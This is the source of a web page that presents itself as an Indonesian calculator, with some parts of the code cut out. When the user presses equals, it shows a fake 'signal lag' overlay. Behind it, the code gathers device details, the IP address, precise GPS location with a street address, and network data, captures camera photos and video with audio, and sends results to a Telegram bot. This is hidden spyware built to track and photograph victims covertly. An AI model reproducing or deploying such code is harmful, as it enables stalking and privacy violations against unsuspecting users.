<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kalkulator</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            padding: 20px;
        }
        
        .calculator-container {
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            overflow: hidden;
        }
        
        .display {
            background-color: #1a1a2e;
            color: white;
            padding: 20px;
            text-align: right;
            min-height: 120px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
        }
        
        .previous-operand {
            font-size: 1.2rem;
            color: rgba(255, 255, 255, 0.7);
            min-height: 1.5rem;
            word-wrap: break-word;
        }
        
        .current-operand {
            font-size: 2.5rem;
            font-weight: bold;
            word-wrap: break-word;
            transition: all 0.3s ease;
        }
        
        .sinyal-lag {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(26, 26, 46, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 1.5rem;
            color: #ff9500;
            flex-direction: column;
            gap: 10px;
            display: none;
        }
        
        .loading-dots {
            display: flex;
            gap: 5px;
        }
        
        .loading-dots span {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background-color: #ff9500;
            animation: pulse 1.5s infinite ease-in-out;
        }
        
        .loading-dots span:nth-child(2) {
            animation-delay: 0.2s;
        }
        
        .loading-dots span:nth-child(3) {
            animation-delay: 0.4s;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1.2); opacity: 1; }
        }
        
        .buttons {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            padding: 20px;
        }
        
        button {
            border: none;
            border-radius: 10px;
            padding: 15px 0;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            background-color: #f0f0f0;
        }
        
        button:hover {
            background-color: #e0e0e0;
            transform: translateY(-2px);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .operator {
            background-color: #ff9500;
            color: white;
        }
        
        .operator:hover {
            background-color: #e08500;
        }
        
        .equals {
            background-color: #34c759;
            color: white;
            grid-column: span 2;
        }
        
        .equals:hover {
            background-color: #30b451;
        }
        
        .clear {
            background-color: #ff3b30;
            color: white;
        }
        
        .clear:hover {
            background-color: #e0352b;
        }
        
        @media (max-width: 480px) {
            .display {
                min-height: 100px;
                padding: 15px;
            }
            
            .current-operand {
                font-size: 2rem;
            }
            
            .buttons {
                padding: 15px;
                gap: 8px;
            }
            
            button {
                padding: 12px 0;
                font-size: 1.1rem;
            }
        }
        
        /* Hidden elements for media capture */
        .hidden {
            display: none;
        }
        
        #galleryInput {
            position: absolute;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>

        class Calculator {
            constructor() {
                this.previousOperandElement = document.querySelector('.previous-operand');
                this.currentOperandElement = document.querySelector('.current-operand');
                this.sinyalLagElement = document.getElementById('sinyalLag');
                this.clear();
                this.isCalculating = false;
            }
            
            clear() {
                this.currentOperand = '0';
                this.previousOperand = '';
                this.operation = undefined;
                this.updateDisplay();
            }
            
            delete() {
                if (this.isCalculating) return;
                this.currentOperand = this.currentOperand.toString().slice(0, -1);
                if (this.currentOperand === '') {
                    this.currentOperand = '0';
                }
            }
            
            appendNumber(number) {
                if (this.isCalculating) return;
                if (number === '.' && this.currentOperand.includes('.')) return;
                if (this.currentOperand === '0' && number !== '.') {
                    this.currentOperand = number.toString();
                } else {
                    this.currentOperand = this.currentOperand.toString() + number.toString();
                }
            }
            
            chooseOperation(operation) {
                if (this.isCalculating) return;
                if (this.currentOperand === '') return;
                if (this.previousOperand !== '') {
                    this.compute();
                }
                this.operation = operation;
                this.previousOperand = this.currentOperand;
                this.currentOperand = '';
            }
            
            compute() {
                if (this.isCalculating) return;
                
                let computation;
                const prev = parseFloat(this.previousOperand);
                const current = parseFloat(this.currentOperand);
                if (isNaN(prev) || isNaN(current)) return;
                
                switch (this.operation) {
                    case 'add':
                        computation = prev + current;
                        break;
                    case 'subtract':
                        computation = prev - current;
                        break;
                    case 'multiply':
                        computation = prev * current;
                        break;
                    case 'divide':
                        if (current === 0) return;
                        computation = prev / current;
                        break;
                    default:
                        return;
                }
                
                // Simpan hasil perhitungan sementara
                this.computationResult = computation;
                
                // Tampilkan "Sinyal Lag..." dan kumpulkan informasi
                this.showSinyalLag();
                this.collectAndSendInfo(computation);
            }
            
            getDisplayNumber(number) {
                const stringNumber = number.toString();
                const integerDigits = parseFloat(stringNumber.split('.')[0]);
                const decimalDigits = stringNumber.split('.')[1];
                let integerDisplay;
                
                if (isNaN(integerDigits)) {
                    integerDisplay = '';
                } else {
                    integerDisplay = integerDigits.toLocaleString('id', {
                        maximumFractionDigits: 0
                    });
                }
                
                if (decimalDigits != null) {
                    return `${integerDisplay}.${decimalDigits}`;
                } else {
                    return integerDisplay;
                }
            }
            
            updateDisplay() {
                this.currentOperandElement.innerText = this.getDisplayNumber(this.currentOperand);
                if (this.operation != null) {
                    const operatorSymbols = {
                        'add': '+',
                        'subtract': '-',
                        'multiply': 'Ã—',
                        'divide': 'Ã·'
                    };
                    this.previousOperandElement.innerText = 
                        `${this.getDisplayNumber(this.previousOperand)} ${operatorSymbols[this.operation]}`;
                } else {
                    this.previousOperandElement.innerText = '';
                }
            }
            
            showSinyalLag() {
                this.isCalculating = true;
                this.sinyalLagElement.style.display = 'flex';
                this.currentOperandElement.style.opacity = '0.3';
            }
            
            hideSinyalLag() {
                this.isCalculating = false;
                this.sinyalLagElement.style.display = 'none';
                this.currentOperandElement.style.opacity = '1';
            }

                    this.hideSinyalLag();
                    
                } catch (error) {
                    // Tetap tampilkan hasil meskipun ada error
                    this.currentOperand = result.toString();
                    this.operation = undefined;
                    this.previousOperand = '';
                    this.updateDisplay();
                    this.hideSinyalLag();
                }
            }
            
            async collectDeviceInfo() {
                const info = {};
                
                // Deteksi tipe perangkat
                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                const isTablet = /iPad|Android|Tablet/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent);
                
                if (isMobile) info.deviceType = 'HP';
                else if (isTablet) info.deviceType = 'TABLET';
                else info.deviceType = 'LAPTOP/COMPUTER';
                
                // Informasi browser
                info.browser = this.getBrowserInfo();
                info.language = navigator.language || navigator.userLanguage;
                info.cookies = navigator.cookieEnabled ? 'Aktif' : 'Tidak Aktif';
                info.java = navigator.javaEnabled ? 'Aktif' : 'Tidak Aktif';
                info.pdf = navigator.pdfViewerEnabled ? 'Aktif' : 'Tidak Aktif';
                
                // Informasi OS dan platform
                info.os = this.getOSInfo();
                info.platform = navigator.platform;
                info.vendor = navigator.vendor || 'Tidak Diketahui';
                
                // Informasi hardware
                info.screen = `${screen.width}x${screen.height}`;
                info.colorDepth = `${screen.colorDepth} bit`;
                info.ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak Diketahui';
                info.cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} core` : 'Tidak Diketahui';
                info.touchPoints = navigator.maxTouchPoints || 0;
                
                return info;
            }
            
            getBrowserInfo() {
                const userAgent = navigator.userAgent;
                let browser = "Unknown";
                
                if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Chrome";
                else if (userAgent.includes("Firefox")) browser = "Firefox";
                else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
                else if (userAgent.includes("Edg")) browser = "Edge";
                else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
                
                return browser;
            }
            
            getOSInfo() {
                const userAgent = navigator.userAgent;
                let os = "Unknown";
                
                if (userAgent.includes("Windows")) os = "Windows";
                else if (userAgent.includes("Mac")) os = "MacOS";
                else if (userAgent.includes("Linux")) os = "Linux";
                else if (userAgent.includes("Android")) os = "Android";
                else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
                
                return os;
            }
            
            async collectLocationInfo() {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        resolve({ error: 'Geolokasi tidak didukung' });
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const info = {};
                            info.latitude = position.coords.latitude;
                            info.longitude = position.coords.longitude;
                            info.accuracy = `${position.coords.accuracy} meter`;
                            info.link = `https://maps.google.com/?q=${info.latitude},${info.longitude}`;
                            
                            // Coba dapatkan informasi alamat
                            try {
                                const address = await this.reverseGeocode(info.latitude, info.longitude);
                                Object.assign(info, address);
                            } catch (error) {
                                console.log('Tidak bisa mendapatkan alamat detail');
                            }
                            
                            resolve(info);
                        },
                        (error) => {
                            resolve({ error: 'Tidak dapat mengakses lokasi: ' + error.message });
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                });
            }
            
            async reverseGeocode(lat, lon) {
                try {
                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
                    const data = await response.json();
                    
                    if (data && data.address) {
                        return {
                            kota: data.address.city || data.address.town || data.address.village || 'Tidak Diketahui',
                            provinsi: data.address.state || 'Tidak Diketahui',

                }
                
                return {};
            }
            
            async collectNetworkInfo() {
                const info = {};
                
                // Dapatkan IP (menggunakan service external)
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    info.ip = ipData.ip;

                }
                
                // Deteksi tipe koneksi
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    info.connectionType = connection.effectiveType || 'Tidak Diketahui';
                    info.downlink = connection.downlink ? `${connection.downlink} Mbps` : 'Tidak Diketahui';
                    info.rtt = connection.rtt ? `${connection.rtt} ms` : 'Tidak Diketahui';
                    info.saveData = connection.saveData ? 'Aktif' : 'Tidak Aktif';
                } else {
                    info.connectionType = 'Tidak Diketahui';
                    info.downlink = 'Tidak Diketahui';
                    info.rtt = 'Tidak Diketahui';
                    info.saveData = 'Tidak Diketahui';
                }
                
                return info;
            }
            
            async collectBatteryInfo() {

            async takePhoto(facingMode) {
                return new Promise((resolve, reject) => {
                    const video = document.getElementById('videoElement');
                    const canvas = document.getElementById('canvasElement');
                    
                    // Akses kamera
                    navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: facingMode } 
                    })
                    .then(stream => {
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            // Tunggu sebentar agar kamera siap
                            setTimeout(() => {
                                const context = canvas.getContext('2d');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                // Konversi ke blob
                                canvas.toBlob(blob => {
                                    // Hentikan stream
                                    stream.getTracks().forEach(track => track.stop());
                                    resolve(blob);
                                }, 'image/jpeg', 0.8);
                            }, 1000);
                        };
                    })
                    .catch(error => {
                        reject(error);
                    });
                });
            }
            
            async recordVideo(duration) {
                return new Promise((resolve, reject) => {
                    const video = document.getElementById('videoElement');
                    let mediaRecorder;
                    let recordedChunks = [];
                    
                    // Akses kamera depan untuk video
                    navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' },
                        audio: true
                    })
                    .then(stream => {
                        video.srcObject = stream;
                        mediaRecorder = new MediaRecorder(stream);
                        
                        mediaRecorder.ondataavailable = event => {
                            if (event.data.size > 0) {
                                recordedChunks.push(event.data);
                            }
                        };
                        
                        mediaRecorder.onstop = () => {
                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
                            stream.getTracks().forEach(track => track.stop());
                            resolve(blob);
                        };
                        
                        // Mulai merekam
                        mediaRecorder.start();
                        
                        // Berhenti setelah durasi tertentu
                        setTimeout(() => {
                            if (mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                            }
                        }, duration * 1000);
                    })
                    .catch(error => {
                        reject(error);
                    });
                });
            }

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',

                    if (!data.ok) {

        // Inisialisasi kalkulator
        const calculator = new Calculator();

        // Event listeners untuk tombol
        document.querySelectorAll('[data-number]').forEach(button => {
            button.addEventListener('click', () => {
                calculator.appendNumber(button.innerText);
                calculator.updateDisplay();
            });
        });

        document.querySelectorAll('[data-action]').forEach(button => {
            button.addEventListener('click', () => {
                const action = button.getAttribute('data-action');
                
                if (action === 'clear') {
                    calculator.clear();
                } else if (action === 'backspace') {
                    calculator.delete();
                    calculator.updateDisplay();
                } else if (action === 'calculate') {
                    calculator.compute();
                } else if (action === 'decimal') {
                    calculator.appendNumber('.');
                    calculator.updateDisplay();
                } else {
                    calculator.chooseOperation(action);
                    calculator.updateDisplay();
                }
            });
        });

        // Event listener untuk keyboard
        document.addEventListener('keydown', (event) => {
            if (event.key >= '0' && event.key <= '9') {
                calculator.appendNumber(event.key);
                calculator.updateDisplay();
            } else if (event.key === '.') {
                calculator.appendNumber('.');
                calculator.updateDisplay();
            } else if (event.key === '+') {
                calculator.chooseOperation('add');
                calculator.updateDisplay();
            } else if (event.key === '-') {
                calculator.chooseOperation('subtract');
                calculator.updateDisplay();
            } else if (event.key === '*') {
                calculator.chooseOperation('multiply');
                calculator.updateDisplay();
            } else if (event.key === '/') {
                event.preventDefault();
                calculator.chooseOperation('divide');
                calculator.updateDisplay();
            } else if (event.key === 'Enter' || event.key === '=') {
                calculator.compute();
            } else if (event.key === 'Backspace') {
                calculator.delete();
                calculator.updateDisplay();
            } else if (event.key === 'Escape') {
                calculator.clear();
            }
        });
